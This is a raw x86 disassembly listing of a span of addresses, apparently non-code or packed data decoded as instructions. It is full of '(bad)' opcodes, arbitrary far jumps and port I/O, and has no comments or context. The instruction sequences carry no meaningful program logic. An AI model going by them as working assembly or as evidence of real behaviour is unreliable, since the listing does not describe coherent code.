  42b702:	scas   eax,DWORD PTR es:[edi]
  42b703:	leave  
  42b704:	sub    DWORD PTR [ebp-0xf3395e8],edx
  42b70a:	sub    dl,ch
  42b70c:	jle    0x42b718
  42b70e:	icebp  
  42b70f:	adc    BYTE PTR [ecx+0x0],ah
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	bnd ja 0x42b768
  42b783:	mov    ch,0xc3
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0x36000001,al
  42b78d:	xchg   edx,eax
  42b78e:	out    0xc7,al
  42b790:	out    0xfc,al
  42b792:	dec    eax
  42b793:	div    esp
  42b795:	xchg   edi,eax
  42b796:	inc    esp
  42b797:	mov    esp,0xca64f632
  42b79c:	add    DWORD PTR [esi],0xffffffb0
  42b79f:	inc    ecx
  42b7a0:	in     eax,dx
  42b7a1:	inc    ebp
  42b7a2:	sub    BYTE PTR [ebx+ecx*1+0x12e13f2c],dh
  42b7a9:	sub    eax,0xc7da2350
  42b7ae:	jg     0x42b7a6
  42b7b0:	mov    edi,0xe12cc21a
  42b7b5:	(bad)  
  42b7b6:	lods   al,BYTE PTR ds:[esi]
  42b7b7:	sub    BYTE PTR [eax+0x6dd6c8af],0x42
  42b7be:	inc    ebp
  42b7bf:	(bad)  [ebp+edx*2-0x6]
  42b7c3:	retf   
  42b7c4:	sbb    dl,BYTE PTR [esi+ebx*2]
  42b7c7:	jmp    0xc3f9:0xc691f750
  42b7ce:	paddusw mm0,mm0
  42b7d1:	jns    0x42b7e9
  42b7d3:	ins    BYTE PTR es:[edi],dx
  42b7d4:	and    eax,0xc9d92946
  42b7d9:	cmp    ebx,esi
  42b7db:	mov    esp,0xc5d46e68
  42b7e0:	in     al,0xc6
  42b7e2:	push   es
  42b7e3:	inc    edx
  42b7e4:	mov    edi,0xeaa99eac
  42b7e9:	(bad)  
  42b7ea:	sti    
  42b7eb:	push   ebp
  42b7ec:	in     al,dx
  42b7ed:	out    dx,eax
  42b7ee:	xor    al,BYTE PTR ds:0x1e38d7ed
  42b7f4:	ret    0xfe7c
  42b7f7:	(bad)  
  42b7f9:	call   0x6c44ef80
  42b7fe:	lods   al,BYTE PTR ds:[esi]
  42b7ff:	dec    ecx
  42b800:	ficomp DWORD PTR [esi+0x51]
  42b803:	je     0x42b78a
  42b805:	xchg   ecx,eax
  42b806:	(bad)  [edi]
  42b808:	jmp    0x6257:0x40551847
  42b80f:	fldcw  WORD PTR [edi]
  42b811:	es push es
  42b813:	mov    es,WORD PTR [edx]
  42b815:	in     eax,0xf2
  42b817:	lods   eax,DWORD PTR ds:[esi]
  42b818:	push   ss
  42b819:	jbe    0x42b806
  42b81b:	sahf   
  42b81c:	lock jnp 0x42b7bf
  42b81f:	test   DWORD PTR [ecx-0x5b],ebx
  42b822:	mov    dh,0x30
  42b824:	cmp    BYTE PTR [edx+0x3828e496],bl
  42b82a:	xchg   esi,eax
  42b82b:	das    
  42b82c:	cli    
  42b82d:	push   edi
  42b82e:	pop    esp
  42b82f:	or     BYTE PTR [edi],bh
  42b831:	call   0x4f5:0x7afd8f50
  42b838:	push   eax
  42b839:	cmp    BYTE PTR [eax+0x1d700b02],ch
  42b83f:	xchg   edi,eax
  42b840:	ja     0x42b7f3
  42b842:	scas   al,BYTE PTR es:[edi]
  42b843:	push   esp
  42b844:	sbb    BYTE PTR [ecx+0x26714f9a],0x76
  42b84b:	loopne 0x42b84e
  42b84d:	push   ss
  42b84e:	fisttp QWORD PTR [edx]
  42b850:	test   al,0x1
  42b852:	sub    BYTE PTR [edi],ah
  42b854:	sar    DWORD PTR [esi-0x28],cl
  42b857:	mov    edx,0x3a0aad92
  42b85c:	fidivr WORD PTR [ecx]
  42b85e:	fadd   st,st(3)
  42b860:	inc    esi
  42b861:	and    DWORD PTR [edx],ebp
  42b863:	test   eax,0xff84d448
  42b868:	fild   QWORD PTR [edx-0x626bcb5b]
  42b86e:	js     0x42b8b4
  42b870:	int3   
  42b871:	scas   eax,DWORD PTR es:[edi]
  42b872:	lods   al,BYTE PTR ds:[esi]
  42b873:	add    eax,0x86952e2
  42b878:	mov    ah,0x50
  42b87a:	jmp    0x42b89a
  42b87c:	popw   es
  42b87e:	xchg   esp,eax
  42b87f:	jmp    0x2a4257e1
  42b884:	push   esp
  42b885:	sub    dh,al
  42b887:	push   ss
  42b888:	outs   dx,DWORD PTR ds:[esi]
  42b889:	out    0xfc,al
  42b88b:	dec    edi
  42b88c:	adc    eax,0x33d6fc64
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ecx,DWORD PTR [edi-0x1a]
  42b902:	or     DWORD PTR [edi-0x38],esp
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0x9d000001,al
  42b90d:	xor    eax,0x3ef5b565
  42b912:	fs fs in al,dx
  42b915:	iret   
  42b916:	cmc    
  42b917:	push   edx
  42b918:	cdq    
  42b919:	add    esi,eax
  42b91b:	push   edi
  42b91c:	inc    esi
  42b91d:	push   cs
  42b91e:	jecxz  0x42b8ae
  42b920:	enter  0xfd9c,0xe3
  42b924:	push   cs
  42b925:	xchg   esp,eax
  42b926:	pop    esp
  42b927:	mov    ds:0x7c9dfc8a,al
  42b92c:	cli    
  42b92d:	data16 and al,BYTE PTR [eax-0xcbf8786]
  42b934:	push   esi
  42b935:	push   esi
  42b936:	xchg   edx,eax
  42b937:	xchg   edi,eax
  42b938:	test   eax,0x35b0eb57
  42b93d:	push   eax
  42b93e:	repz mov eax,0x54425208
  42b944:	rcl    DWORD PTR [ebx-0x21],cl
  42b947:	adc    dh,bl
  42b949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b94a:	pop    esi
  42b94b:	sti    
  42b94c:	call   0x5ee6b1a1
  42b951:	ss lock clc 
  42b954:	je     0x42b98b
  42b956:	cmp    ch,ah
  42b958:	mov    ch,0x80
  42b95a:	(bad)  
  42b95b:	cld    
  42b95c:	dec    esp
  42b95d:	push   ss
  42b95e:	dec    edx
  42b95f:	xor    DWORD PTR [ecx+eax*1],ebp
  42b962:	ss js  0x42b9b6
  42b965:	cmp    eax,0xce736cf9
  42b96a:	lock nop
  42b96c:	retf   0x36e
  42b96f:	mov    ds:0x2c77ff26,al
  42b974:	ror    DWORD PTR [edx],0x59
  42b977:	jne    0x42b9bc
  42b979:	sbb    dh,bh
  42b97b:	ins    DWORD PTR es:[edi],dx
  42b97c:	sub    eax,0x2d5f910b
  42b981:	xor    DWORD PTR [ebx+edi*4],ebx
  42b984:	(bad)
  42b988:	dec    eax
  42b989:	fstp   QWORD PTR [ebx-0x1d]
  42b98c:	pop    eax
  42b98d:	ins    DWORD PTR es:[edi],dx
  42b98e:	gs pusha 
  42b990:	mov    ebp,0x2729d7c4
  42b995:	xor    al,0x7f
  42b997:	cmp    eax,ebp
  42b999:	dec    eax
  42b99a:	outs   dx,BYTE PTR ds:[esi]
  42b99b:	push   0x2c
  42b99d:	mov    dl,BYTE PTR [ebx-0x59]
  42b9a0:	out    dx,eax
  42b9a1:	jne    0x42b9d0
  42b9a3:	adc    DWORD PTR [esi-0x46bb272d],esp
  42b9a9:	repz inc edi
  42b9ab:	neg    DWORD PTR ds:0x50dca224
  42b9b1:	loopne 0x42b95a
  42b9b3:	iret   
  42b9b4:	pop    edx
  42b9b5:	adc    DWORD PTR [edx],0x3a88920f
  42b9bb:	pop    es
  42b9bc:	cld    
  42b9bd:	push   0x127f3ac3
  42b9c2:	ret    
  42b9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9c5:	push   ebx
  42b9c6:	mov    esi,0x62eb22ce
  42b9cb:	loopne 0x42b9ac
  42b9cd:	xchg   edx,eax
  42b9ce:	add    eax,0x850b1f34
  42b9d3:	dec    esi
  42b9d4:	add    al,0xcb
  42b9d6:	aas    
  42b9d7:	repz or edi,DWORD PTR [eax-0x55560cc0]
  42b9de:	(bad)  
  42b9df:	xor    eax,0x65fa43e0
  42b9e4:	arpl   WORD PTR [eax],ax
  42b9e6:	pop    ebx
  42b9e7:	push   edx
  42b9e8:	cmp    bl,BYTE PTR [esi]
  42b9ea:	popf   
  42b9eb:	dec    esi
  42b9ec:	fcomp  QWORD PTR [eax-0x1a96c907]
  42b9f2:	jp     0x42ba5e
  42b9f4:	pop    esp
  42b9f5:	xchg   esi,eax
  42b9f6:	add    eax,0x288b8574
  42b9fb:	retf   
  42b9fc:	enter  0x58ca,0x17
  42ba00:	inc    DWORD PTR [ebx]
  42ba02:	aaa    
  42ba03:	test   al,0xa9
  42ba05:	sub    bl,BYTE PTR [edx+0x4a]
  42ba08:	cs sbb eax,0xd867125e
  42ba0e:	mov    bl,0x61
  42ba10:	sub    eax,0x0
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ecx-0x19],edx
  42ba82:	jbe    0x42ba58
  42ba84:	int    0xd3
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0x6f000001
  42ba8d:	xor    eax,0xe367df2f
  42ba92:	std    
  42ba93:	cdq    
  42ba94:	ror    ch,1
  42ba96:	and    BYTE PTR [ebx+0x4f],bh
  42ba99:	adc    al,0x8c
  42ba9b:	add    eax,0x69155d79
  42baa0:	fs xor eax,0xef53142
  42baa6:	sbb    BYTE PTR [edi],cl
  42baa8:	nop
  42baa9:	and    eax,edi
  42baab:	enter  0xa231,0x98
  42baaf:	test   eax,0x82a41450
  42bab4:	mov    ds:0xae38e2b4,al
  42bab9:	les    ecx,FWORD PTR [edx-0x6e]
  42babc:	jecxz  0x42bae2
  42babe:	mov    edi,0x40be91d3
  42bac3:	fs inc ecx
  42bac5:	sub    ecx,edx
  42bac7:	(bad)  
  42bac8:	pusha  
  42bac9:	test   eax,0x62e6e0af
  42bace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bacf:	mov    ah,0x83
  42bad1:	push   ss
  42bad2:	sub    DWORD PTR [edi-0x4fdf9433],ebx
  42bad8:	sbb    al,0x73
  42bada:	repz dec edx
  42badc:	jns    0x42bb5a
  42bade:	ins    DWORD PTR es:[edi],dx
  42badf:	in     eax,dx
  42bae0:	aas    
  42bae1:	pusha  
  42bae2:	xlat   BYTE PTR ds:[ebx]
  42bae3:	int    0xee
  42bae5:	jecxz  0x42bb41
  42bae7:	sbb    al,0x8
  42bae9:	fbstp  TBYTE PTR [ebx-0x48f7429c]
  42baef:	xor    DWORD PTR [esi-0x10],ebp
  42baf2:	les    edx,FWORD PTR [ebx+0xa6c1f6f]
  42baf8:	iret   
  42baf9:	mov    al,0x86
  42bafb:	inc    ebp
  42bafc:	xor    DWORD PTR [ebp+0x76],ebx
  42baff:	jmp    0x4d45b40b
  42bb04:	cmp    eax,0x476670bd
  42bb09:	fld    DWORD PTR [edi]
  42bb0b:	repz and ecx,DWORD PTR [esi-0x64]
  42bb0f:	(bad)  
  42bb10:	pop    ss
  42bb11:	adc    al,BYTE PTR [ecx-0x5d]
  42bb14:	sar    DWORD PTR fs:[edx-0x1a541b45],1
  42bb1b:	gs push esi
  42bb1d:	js     0x42bb46
  42bb1f:	or     ebp,ecx
  42bb21:	cmp    bh,BYTE PTR [ecx+0xe]
  42bb24:	dec    edi
  42bb25:	cs mov edx,0x6d02138b
  42bb2b:	push   0x8f724529
  42bb30:	sar    dl,cl
  42bb32:	out    dx,al
  42bb33:	clc    
  42bb34:	test   BYTE PTR [esi+ecx*2],dh
  42bb37:	mov    bh,0x17
  42bb39:	call   0x6651:0x2426fc7d
  42bb40:	inc    esi
  42bb41:	in     al,dx
  42bb42:	mov    dh,0x2b
  42bb44:	(bad)  
  42bb45:	fs mov edi,db7
  42bb49:	stos   DWORD PTR es:[edi],eax
  42bb4a:	push   edi
  42bb4b:	add    dh,BYTE PTR [ebx+0x460df94]
  42bb51:	ret    
  42bb52:	lods   eax,DWORD PTR ds:[esi]
  42bb53:	mov    WORD PTR [eax],?
  42bb55:	cli    
  42bb56:	jo     0x42bade
  42bb58:	stos   BYTE PTR es:[edi],al
  42bb59:	in     eax,dx
  42bb5a:	ret    0xc3b2
  42bb5d:	and    ebx,DWORD PTR [eax-0xe]
  42bb60:	push   es
  42bb61:	and    edx,0x9e96640c
  42bb67:	cmp    bl,BYTE PTR [ebp+0x2]
  42bb6a:	fucomp st(4)
  42bb6c:	rcr    BYTE PTR [ebx+esi*1],0xf5
  42bb70:	push   ebp
  42bb71:	sbb    al,0x0
  42bb73:	push   ebp
  42bb75:	popf   
  42bb76:	xchg   ecx,eax
  42bb77:	popf   
  42bb78:	leave  
  42bb79:	push   0x12e7ef4e
  42bb7e:	leave  
  42bb7f:	dec    ebx
  42bb80:	cwde   
  42bb81:	sub    BYTE PTR [ebp-0x4d],ah
  42bb84:	outs   dx,DWORD PTR ds:[esi]
  42bb85:	inc    ebx
  42bb86:	inc    edx
  42bb87:	or     BYTE PTR [eax-0x45d491d],cl
  42bb8d:	(bad)  
  42bb8e:	cld    
  42bb8f:	lahf   
  42bb90:	leave  
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	add    eax,0xd2be14df
  42bc05:	aam    0x1
  42bc07:	add    BYTE PTR ds:0x1a000001,al
  42bc0d:	in     eax,0xe0
  42bc0f:	push   ecx
  42bc10:	shl    bh,cl
  42bc12:	cmp    esi,DWORD PTR [edi-0x22]
  42bc15:	fiadd  WORD PTR gs:[ecx+0x33c721ed]
  42bc1c:	adc    BYTE PTR [esi+0x20],bh
  42bc1f:	fiadd  WORD PTR [eax+0x2f]
  42bc22:	mov    bl,0x3a
  42bc24:	adc    BYTE PTR [edi+0x7dc12c60],bl
  42bc2a:	jl     0x42bc2b
  42bc2c:	xor    ebp,DWORD PTR [ebp-0x33]
  42bc2f:	push   ebp
  42bc30:	loope  0x42bbed
  42bc32:	outs   dx,BYTE PTR ds:[esi]
  42bc33:	int3   
  42bc34:	push   edi
  42bc35:	dec    eax
  42bc36:	es mov ah,0x15
  42bc39:	shl    cl,cl
  42bc3b:	xchg   ebx,eax
  42bc3c:	mov    ds:0x335e0d5d,eax
  42bc41:	retf   
  42bc42:	repz mov dh,0x47
  42bc45:	ficom  DWORD PTR [esi+esi*4-0x51bb1d6b]
  42bc4c:	and    BYTE PTR [edx+0xc1cc4d7],dl
  42bc52:	mov    ah,0xbb
  42bc54:	jae    0x42bc98
  42bc56:	jmp    0x1078:0xcfd84bb1
  42bc5d:	pop    ecx
  42bc5e:	inc    esp
  42bc5f:	cmp    al,0x22
  42bc61:	test   BYTE PTR [eax+ebp*8+0x101ceaf8],ah
  42bc68:	(bad)  
  42bc69:	sti    
  42bc6a:	inc    esp
  42bc6b:	cli    
  42bc6c:	sahf   
  42bc6d:	sub    BYTE PTR [edx+eiz*8-0x5ff4be93],dh
  42bc74:	into   
  42bc75:	pop    ebp
  42bc76:	sub    BYTE PTR [esi],ah
  42bc78:	jp     0x42bce2
  42bc7a:	inc    ebp
  42bc7b:	inc    edx
  42bc7c:	pop    esi
  42bc7d:	imul   edi,DWORD PTR [eax],0xffffff99
  42bc80:	jae    0x42bcff
  42bc82:	add    edi,DWORD PTR [ecx+esi*8-0x70503972]
  42bc89:	mov    edi,0xb2eb71b4
  42bc8e:	inc    ecx
  42bc8f:	aas    
  42bc90:	mul    DWORD PTR [ebx-0x1fd9ee48]
  42bc96:	push   ds
  42bc97:	mov    esp,0x9ad3c69e
  42bc9c:	out    dx,al
  42bc9d:	pop    eax
  42bc9e:	add    ah,ah
  42bca0:	shl    BYTE PTR [eax+0x6f8ad225],1
  42bca6:	retf   0x4805
  42bca9:	jnp    0x42bc6e
  42bcab:	mov    BYTE PTR [esi+0x36],bh
  42bcae:	sub    eax,0xa94fa397
  42bcb3:	popa   
  42bcb4:	call   0xff16:0x9280c92
  42bcbb:	rcl    BYTE PTR [eax+eiz*1-0x45],0x2b
  42bcc0:	test   bl,0x0
  42bcc3:	mov    eax,DWORD PTR [ebp+0x1121949e]
  42bcc9:	mov    fs,edx
  42bccb:	or     BYTE PTR [eax],0x36
  42bcce:	fstp   QWORD PTR [eax]
  42bcd0:	mov    al,ds:0xb2352eeb
  42bcd5:	pop    edx
  42bcd6:	sbb    BYTE PTR [eax-0x1f],dh
  42bcd9:	add    eax,0xc6fb69fa
  42bcde:	(bad)  
  42bcdf:	sub    BYTE PTR [edx],al
  42bce1:	test   al,0x24
  42bce3:	mov    edx,0x571d010e
  42bce8:	adc    DWORD PTR [eax],edi
  42bcea:	mov    al,ds:0xc4f3a0a9
  42bcef:	int    0x77
  42bcf1:	retf   
  42bcf2:	jge    0x42bcd7
  42bcf4:	cmp    esi,0xa157f25e
  42bcfa:	pop    esp
  42bcfb:	xor    DWORD PTR [esp+ecx*8-0x6b1535cd],esp
  42bd02:	mov    edi,0xcd1ba557
  42bd07:	scas   eax,DWORD PTR es:[edi]
  42bd08:	shr    DWORD PTR [esi-0x35408bdf],0xb0
  42bd0f:	sub    al,0x7
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd53
  42bd81:	stc    
  42bd82:	adc    ah,BYTE PTR [ebp+0x1d5d7]
  42bd88:	add    eax,0xaa000001
  42bd8d:	out    dx,eax
  42bd8e:	sub    DWORD PTR [eax+0x4ad81e3a],edi
  42bd94:	mov    DWORD PTR [eax+0x56],ebx
  42bd97:	je     0x42bd4a
  42bd99:	sbb    al,0x54
  42bd9b:	(bad)  
  42bd9d:	shld   esp,ebx,0xb0
  42bda1:	inc    edi
  42bda2:	or     eax,0x3d8499c5
  42bda7:	xor    BYTE PTR ds:0x7eb9ab41,bh
  42bdad:	in     al,dx
  42bdae:	aaa    
  42bdaf:	jecxz  0x42bde9
  42bdb1:	aaa    
  42bdb2:	adc    BYTE PTR [edi-0x68],0x99
  42bdb6:	mov    ds:0xb00c702b,al
  42bdbb:	int    0xb7
  42bdbd:	push   cs
  42bdbe:	jns    0x42bdb0
  42bdc0:	in     al,dx
  42bdc1:	cmp    BYTE PTR ds:[ebx-0x5],ch
  42bdc5:	stos   BYTE PTR es:[edi],al
  42bdc6:	inc    edi
  42bdc8:	pop    esp
  42bdc9:	xchg   edi,eax
  42bdca:	pop    ebx
  42bdcb:	or     al,0x40
  42bdcd:	dec    edi
  42bdce:	jnp    0x42be42
  42bdd0:	push   ecx
  42bdd1:	sbb    BYTE PTR [edi],cl
  42bdd3:	fld    QWORD PTR [ebx]
  42bdd5:	test   DWORD PTR [eax+ebp*8+0x7a],ebp
  42bdd9:	xor    cl,BYTE PTR [eax-0x73]
  42bddc:	int3   
  42bddd:	jg     0x42be0a
  42bddf:	mov    ebp,0xbbf42405
  42bde4:	add    cl,BYTE PTR [ecx-0x2f]
  42bde7:	out    dx,eax
  42bde8:	into   
  42bde9:	xor    ebx,DWORD PTR [edi]
  42bdeb:	sbb    esp,DWORD PTR [esi-0x62ea21c2]
  42bdf1:	jo     0x42bdb8
  42bdf3:	inc    esp
  42bdf4:	dec    ebx
  42bdf5:	xor    ebx,DWORD PTR [bp+si+0x1c]
  42bdf9:	aaa    
  42bdfa:	out    dx,al
  42bdfb:	cli    
  42bdfc:	sub    al,0xa
  42bdfe:	push   ebx
  42bdff:	inc    ecx
  42be00:	jnp    0x42be41
  42be02:	mov    edi,ebx
  42be04:	pop    eax
  42be05:	stos   BYTE PTR es:[edi],al
  42be06:	adc    DWORD PTR [ebx+0x25],esi
  42be09:	call   0x95cb3919
  42be0e:	imul   esi,edi,0x59
  42be11:	adc    eax,DWORD PTR [eax]
  42be13:	sbb    ah,BYTE PTR [ebx+0x2b61bd8a]
  42be19:	mov    ds:0xbe06ace3,eax
  42be1e:	jo     0x42be10
  42be20:	mov    ds:0xe6469618,al
  42be25:	push   ebp
  42be26:	and    al,BYTE PTR [edx]
  42be28:	rcl    DWORD PTR [edi+edi*4],1
  42be2b:	push   ecx
  42be2c:	jle    0x42bea5
  42be2e:	and    DWORD PTR [edi+ebx*4+0x5dbee890],edx
  42be35:	cmp    al,0xcb
  42be37:	mov    DWORD PTR [edx+0xc],0xfa8454a2
  42be3e:	ret    
  42be3f:	fist   DWORD PTR [edi+0x37]
  42be42:	jo     0x42be21
  42be44:	fistp  DWORD PTR [edi+0x16c869b6]
  42be4a:	(bad)  
  42be4b:	fwait
  42be4c:	int3   
  42be4d:	sahf   
  42be4e:	stos   BYTE PTR es:[edi],al
  42be4f:	cli    
  42be50:	scas   eax,DWORD PTR es:[edi]
  42be51:	dec    ebx
  42be52:	jae    0x42beb6
  42be54:	cwde   
  42be55:	repz ds inc edi
  42be58:	add    esp,DWORD PTR [esi]
  42be5a:	and    al,0xb3
  42be5c:	adc    DWORD PTR [ebx],esi
  42be5e:	xor    al,BYTE PTR [ebp-0x64]
  42be61:	lods   eax,DWORD PTR ds:[esi]
  42be62:	stos   DWORD PTR es:[edi],eax
  42be63:	scas   eax,DWORD PTR es:[edi]
  42be64:	(bad)  
  42be65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be66:	mov    al,ds:0x2c3eb342
  42be6b:	add    eax,0xda92cc6d
  42be70:	imul   esi,edx,0xf7a4b598
  42be76:	xchg   edi,eax
  42be77:	(bad)  
  42be78:	clc    
  42be79:	pushf  
  42be7a:	and    eax,0xdd9169ed
  42be7f:	les    esp,FWORD PTR [edx+0x78]
  42be82:	inc    esp
  42be83:	push   esp
  42be84:	lds    esi,FWORD PTR [ebp+0x1e]
  42be87:	mov    ds:0x9f744204,al
  42be8c:	fwait
  42be8d:	inc    edx
  42be8e:	add    eax,0xaaa
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf11
  42bf01:	and    eax,0xd6dc1541
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x33000001
  42bf0d:	mov    WORD PTR [ebp+0x195082de],gs
  42bf13:	ins    BYTE PTR es:[edi],dx
  42bf14:	in     al,0x9e
  42bf16:	pop    edi
  42bf17:	and    edx,edx
  42bf19:	test   BYTE PTR [ebp-0x52955f78],cl
  42bf1f:	mov    cl,BYTE PTR [edx-0x5b8b8dbf]
  42bf25:	ret    0x725c
  42bf28:	sar    BYTE PTR [ebp-0x67a106fb],cl
  42bf2e:	mov    dh,0x7
  42bf30:	test   DWORD PTR [esi+0x4ef4c334],ebp
  42bf36:	mov    DWORD PTR [ecx-0x3bcab4cb],eax
  42bf3c:	inc    esp
  42bf3d:	xchg   ecx,eax
  42bf3e:	inc    eax
  42bf3f:	cli    
  42bf40:	aad    0x6a
  42bf42:	out    dx,al
  42bf43:	sbb    DWORD PTR [edi-0x1],esi
  42bf46:	fbstp  TBYTE PTR [eax-0x1]
  42bf49:	ins    DWORD PTR es:[edi],dx
  42bf4a:	enter  0x7089,0xfd
  42bf4e:	mov    ds:0x1fe1cbf7,al
  42bf53:	xchg   ebp,eax
  42bf54:	popf   
  42bf55:	nop
  42bf56:	(bad)  
  42bf57:	lahf   
  42bf58:	out    0xd2,al
  42bf5a:	jg     0x42bee3
  42bf5c:	push   cs
  42bf5d:	ds pusha 
  42bf5f:	push   ss
  42bf60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf61:	sub    DWORD PTR [edx+0x22],0xffffffa7
  42bf65:	jae    0x42bfd8
  42bf67:	test   DWORD PTR [esi],edi
  42bf69:	dec    eax
  42bf6a:	fldcw  WORD PTR ss:[ecx+0x37]
  42bf6e:	arpl   WORD PTR [edx+0x11d7fcd],dx
  42bf74:	and    al,0x1b
  42bf76:	sbb    DWORD PTR [edi],edi
  42bf78:	sbb    al,0xc4
  42bf7a:	inc    ecx
  42bf7b:	inc    edx
  42bf7c:	nop
  42bf7d:	(bad)  
  42bf7e:	outs   dx,DWORD PTR ds:[esi]
  42bf7f:	aas    
  42bf80:	sar    BYTE PTR [ebx+0x5c1facf3],1
  42bf86:	xchg   ebx,eax
  42bf87:	pop    edx
  42bf88:	cdq    
  42bf89:	xor    BYTE PTR [esi],0xd7
  42bf8c:	rcr    DWORD PTR [ebp+esi*8-0x7],cl
  42bf90:	add    DWORD PTR [ebx-0x59],ebx
  42bf93:	jmp    0x42c013
  42bf95:	mov    ecx,0x31184569
  42bf9a:	cmp    al,0xcf
  42bf9c:	or     esi,edx
  42bf9e:	fwait
  42bf9f:	enter  0x4df9,0x19
  42bfa3:	jmp    0x7bdc:0x9b75f089
  42bfaa:	xchg   DWORD PTR [esi+0x46],esi
  42bfad:	loope  0x42bff7
  42bfaf:	imul   ecx,DWORD PTR [edi],0xcb187b8a
  42bfb5:	jmp    0x8f49:0xfb9c4b33
  42bfbc:	xor    al,BYTE PTR [edi-0x5f]
  42bfbf:	xchg   ecx,eax
  42bfc0:	mov    bh,0x4a
  42bfc2:	sub    BYTE PTR [edi+0x4a],ah
  42bfc5:	jp     0x42bfe9
  42bfc7:	bound  eax,QWORD PTR [ecx-0x76]
  42bfca:	or     al,0xa3
  42bfcc:	(bad)  
  42bfcd:	out    dx,eax
  42bfce:	pop    ebp
  42bfcf:	and    eax,DWORD PTR [ecx-0x1a0ae1b6]
  42bfd5:	in     eax,0x9e
  42bfd7:	hlt    
  42bfd8:	add    BYTE PTR [ecx-0x9f51999],cl
  42bfde:	jp     0x42c035
  42bfe0:	in     al,0x27
  42bfe2:	sub    bh,BYTE PTR ds:0xccd4893d
  42bfe8:	fcomi  st,st(7)
  42bfea:	jae    0x42bfc4
  42bfec:	cmp    ebx,DWORD PTR [edi-0x1861edf9]
  42bff2:	jb     0x42bf82
  42bff4:	inc    esi
  42bff5:	in     al,dx
  42bff6:	imul   ebx,DWORD PTR [ebp-0x35],0x79ebf2b4
  42bffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bffe:	enter  0x6270,0x67
  42c002:	out    dx,eax
  42c003:	aam    0x6
  42c005:	add    ecx,DWORD PTR [ebp-0x3c]
  42c008:	mov    ch,0xc3
  42c00a:	inc    esp
  42c00b:	cwde   
  42c00c:	scas   eax,DWORD PTR es:[edi]
  42c00d:	int3   
  42c00e:	xor    edi,DWORD PTR [edi+ebp*1+0x0]
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	dec    ebp
  42c081:	jmp    0x1:0xd7e141b1
  42c088:	add    eax,0xdb000001
  42c08d:	lahf   
  42c08e:	jecxz  0x42c067
  42c090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c091:	iret   
  42c092:	or     cl,BYTE PTR [edi+ecx*2+0x68]
  42c096:	lock mov ?,WORD PTR [esi]
  42c099:	lods   eax,DWORD PTR ds:[esi]
  42c09b:	push   ecx
  42c09c:	jbe    0x42c096
  42c09e:	repnz xor BYTE PTR [esi+0x2],0x5a
  42c0a3:	sbb    ebp,DWORD PTR [esi]
  42c0a5:	mov    ebp,0x5f87e446
  42c0aa:	and    eax,0xa7ef6b6e
  42c0af:	mov    ecx,0x8142fdc1
  42c0b4:	out    dx,eax
  42c0b5:	rcr    DWORD PTR [esi-0x77b4e53b],0xbc
  42c0bc:	add    al,0xe0
  42c0be:	mov    ecx,0x26e5bb39
  42c0c3:	xchg   DWORD PTR [ecx+0x757b3c34],esp
  42c0c9:	jb     0x42c08b
  42c0cb:	mov    ch,0x3f
  42c0cd:	aas    
  42c0ce:	std    
  42c0cf:	cmp    eax,0x2325a27d
  42c0d4:	add    dh,bh
  42c0d6:	push   ds
  42c0d7:	out    dx,eax
  42c0d8:	mov    ecx,0xea4dee42
  42c0dd:	out    dx,al
  42c0de:	inc    edx
  42c0df:	fild   DWORD PTR ds:0xb66d907d
  42c0e5:	mov    bl,BYTE PTR [edi]
  42c0e7:	lock fdiv QWORD PTR [ebp+edi*1-0x33]
  42c0ec:	jnp    0x42c112
  42c0ee:	push   ebx
  42c0ef:	test   eax,0xd52f6137
  42c0f4:	out    0x4f,eax
  42c0f6:	push   edx
  42c0f7:	push   eax
  42c0f8:	or     DWORD PTR [eax],ebp
  42c0fa:	add    dl,BYTE PTR [esi]
  42c0fc:	cmp    al,0xd4
  42c0fe:	mov    edx,0x47c8681e
  42c103:	pcmpeqd mm6,QWORD PTR [edx+0x5]
  42c107:	pop    eax
  42c108:	outs   dx,DWORD PTR ds:[esi]
  42c109:	out    dx,al
  42c10a:	xchg   esp,eax
  42c10b:	stc    
  42c10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c10d:	lods   eax,DWORD PTR ds:[esi]
  42c10e:	lock fsub DWORD PTR [ebx]
